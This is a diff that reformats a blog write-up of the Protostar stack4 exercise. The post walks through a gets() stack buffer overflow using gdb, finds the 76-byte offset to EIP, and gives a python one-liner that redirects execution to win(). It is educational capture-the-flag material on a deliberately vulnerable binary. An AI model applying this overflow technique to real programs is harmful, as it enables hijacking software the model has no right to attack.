@@ -1,6 +1,8 @@
 ---
+layout: post
 title: Protostar Writeup - stack4
 updated: 2018-08-01 21:00
+tags: [ctf, binary exploit, protostar, tech]
 ---
 
 ## Protostar - stack4
@@ -9,7 +11,7 @@ Moving on to stack4. This is a really good one. It will test your knowledge of h
 Before moving forward, I strongly recommend that you try this one yourself, it's not that easy though :).
 Here's the code we're given:
 
-```c
+{% highlight c %}
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -26,12 +28,12 @@ int main(int argc, char **argv)
 
     gets(buffer);
 }
-```
+{% endhighlight %}
 
 This code is similar to the previous challenge code, with the exception of the function pointer.
-Again our attack plan will target the `gets()` function. First let's debug this code and see what we can find.
+Again our attack plan will target the "gets()" function. First let's debug this code and see what we can find.
 
-```shell
+{% highlight shell %}
 (gdb) set disassembly-flavor intel
 (gdb) disass main
 Dump of assembler code for function main:
@@ -44,9 +46,9 @@ Dump of assembler code for function main:
 0x08048418 <main+16>:	call   0x804830c <gets@plt>
 0x0804841d <main+21>:	leave
 0x0804841e <main+22>:	ret
-```
+{% endhighlight %}
 
-Not much to work with here, other than the `gets()` function. If you take a look at the task description, it's clear that we somehow have to change the value of the EIP register.
+Not much to work with here, other than the "gets()" function. If you take a look at the task description, it's clear that we somehow have to change the value of the EIP register.
 So what is the EIP register? EIP stands for the Extended Instruction Pointer. For simplicity sake I am going to refer to it as just Instruction Pointer or IP for short. What's so special about this register?
 The IP is responsible for storing the address of the next instruction to be executed. This should make it intuitive as to why we want to override the EIP value. If it's not, I'll try my best to explain it to you.
 
@@ -60,7 +62,7 @@ Now unlike the previous programs, you can't really predict where the EIP will be
 First let's get the offset of the EIP. I like using [De Brujin patterns](https://en.wikipedia.org/wiki/De_Bruijn_sequence) for this. You can create your own patterns.
 I create mine using [pwntools](http://docs.pwntools.com/en/stable/). I'm using the debugger to get the address, because without it, all you see is a 'Segmentation Fault' which is not very helpful.
 
-```shell
+{% highlight shell %}
 (gdb) set disassembly-flavor intel
 (gdb) disass main
 Dump of assembler code for function main:
@@ -80,24 +82,24 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 
 Program received signal SIGSEGV, Segmentation fault.
 0x63413563 in ?? ()
-```
+{% endhighlight %}
 
-So we managed to change the EIP to `0x63413563`. Calculating the offset, we see that the EIP is located on the stack at a distance of 76 bytes.
+So we managed to change the EIP to "0x63413563". Calculating the offset, we see that the EIP is located on the stack at a distance of 76 bytes.
 This becomes our padding. That's one half of the job done. Now we need to get the location of the `win()` function.
 
-```shell
+{% highlight shell %}
 (gdb) p win
 $1 = {void (void)} 0x80483f4 <win>
-```
+{% endhighlight %}
 
 This is the address of the `win()` location. Combining this address with the padding is all we need to exploit this binary.
 Let's craft and use our exploit.
 
-```shell
+{% highlight shell %}
 $ python -c "print 'A'*76 + '\xf4\x83\x04\x08'" | ./stack4
 code flow successfully changed
 Segmentation fault
-```
+{% endhighlight %}
 
 Success! The reason we get a segmentation fault is because we didn't use an offical 'call' instruction. And EIP restores garbage when it actually returns from the `win()` function.
 
